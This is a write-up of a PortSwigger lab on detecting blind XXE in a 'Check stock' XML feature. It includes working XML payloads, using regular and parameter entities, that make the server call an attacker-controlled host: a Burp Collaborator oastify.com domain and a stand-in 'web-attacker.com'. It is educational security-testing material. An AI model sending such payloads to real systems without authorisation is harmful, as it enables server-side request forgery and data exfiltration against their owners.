# Blind XXE with out-of-band interaction via XML parameter entities

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities), you'll learn: Blind XXE with out-of-band interaction via XML parameter entities! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134058.png)

In here, we can view other products' details:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134109.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134124.png)

Also, in all products details, we can check the available stocks.

**Let's click on the "Check stock" button, and see the responses in Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134136.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134146.png)

**When we clicked that button, it'll send a POST request to `/product/stock`, with an XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

When we see XML data, it's worth to test XXE (XML external entity) injection, XPATH injection.

**In XXE injection, we can try to trigger an error to identify is there any XXE vulnerability:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        a
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134223.png)

When we parsed an invalid `productId`, it'll response us "Invalid product ID".

Now, we can also test **blind XXE**!

Blind XXE vulnerabilities arise where the application is vulnerable to [XXE injection](https://portswigger.net/web-security/xxe) but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

- You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
- You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

### Detecting blind XXE using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

**Armed with above information, let's try to send the following payload to dectect blind XXE.**

- Go to Burp Suite's Collaborator and copy the payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134309.png)

- Send the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://ma0zo3vdlsichyoboecsqqt8azgr4is7.oastify.com"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134335.png)

However, we see this response:

> "Entities are not allowed for security reasons"

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

```xml
%myparameterentity;
```

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

**XML parameter entities payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % xxe SYSTEM "http://1aceoivsl7irhdoqotc7q5tnaeg74xsm.oastify.com"> %xxe; ]>
<stockCheck>
    <productId>
        %xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134641.png)

- Burp Suite's Collaborator:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134659.png)

As you can see, we've **recieved 2 DNS lookups**, which means **the "Check stock" feature is indeed vulnerable to blind XXE injection**!!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-4/images/Pasted%20image%2020230301134706.png)

# What we've learned:

1. Blind XXE with out-of-band interaction via XML parameter entities